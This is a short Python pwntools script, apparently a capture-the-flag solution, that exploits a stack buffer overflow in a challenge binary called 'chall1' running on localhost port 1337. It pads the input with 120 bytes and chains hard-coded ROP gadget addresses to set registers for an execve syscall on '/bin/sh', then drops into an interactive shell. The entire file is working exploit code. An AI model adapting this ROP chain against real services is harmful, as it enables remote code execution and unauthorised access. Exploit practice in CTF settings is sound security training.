from pwn import *
pop_rax = 0x0000000000401364
pop_rdi = 0x00401366
pop_rsi = 0x00401368
pop_rdx = 0x00401370
bin_sh = 0x401358
syscall = 0x00401372
#context.binary = e = ELF("./chall1")
#p = process("./chall1")
p = remote('localhost',1337)
PAYLOAD =  b"A"*120
PAYLOAD += p64(pop_rdi)
PAYLOAD += p64(bin_sh)

PAYLOAD += p64(pop_rsi)
PAYLOAD += p64(0) 

PAYLOAD += p64(pop_rdx)
PAYLOAD += p64(0)

PAYLOAD += p64(pop_rax)
PAYLOAD += p64(59) # syscall number execve

PAYLOAD += p64(syscall)

p.sendline(PAYLOAD)
p.interactive()
